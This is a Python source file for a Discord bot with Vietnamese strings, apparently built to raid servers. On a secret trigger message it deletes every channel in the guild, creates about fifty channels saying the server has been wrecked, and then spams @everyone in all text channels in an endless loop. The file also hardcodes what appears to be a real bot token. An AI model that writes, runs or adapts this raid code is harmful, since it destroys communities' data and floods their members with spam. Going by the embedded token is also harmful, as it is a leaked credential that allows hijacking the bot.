import discord
from discord.ext import commands
import random
import asyncio


#############################
client = commands.Bot(command_prefix=None)
TOKEN = "OTQ5OTE5MjAyODU1MjM1NTk0.YiRXMg.kOozU_L5T90lyhEf2jqDwTC62e8"


#############################
@client.event
async def on_ready():
    print(f'Bot {client.user.name} đã hoạt động')
    await client.wait_until_ready()
    sta = ['magi đã tạo ra tao',f'Với magi']
    while not client.is_closed():
        a = random.choice(sta)
        await client.change_presence(activity=discord.Streaming(name=a, url='https://www.twitch.tv/your_channel_here'))
        await asyncio.sleep(5)


@client.event
async def on_message(message):
    if message.author.bot == False:
        pass
    if message.content == "!!#thê lôn ma cút bye":
        # vchannel = await message.guild.create_voice_channel("Helo")
        # invite = await discord.TextChannel.create_invite(client.get_channel(vchannel.id))
        # print(invite)
        số_lần = 0
        guild = message.guild
        for channel in guild.channels:
            await channel.delete()
        while số_lần <= 50:
            số_lần += 1
            await guild.create_text_channel('bạn đã bị bay server')
        if số_lần >= 50:
            while True:
                for c in message.guild.text_channels:
                    await c.send("@everyone helo raid server cho mấy bạn vừa lòng") 
    await client.process_commands(message)


##############################
client.run(TOKEN)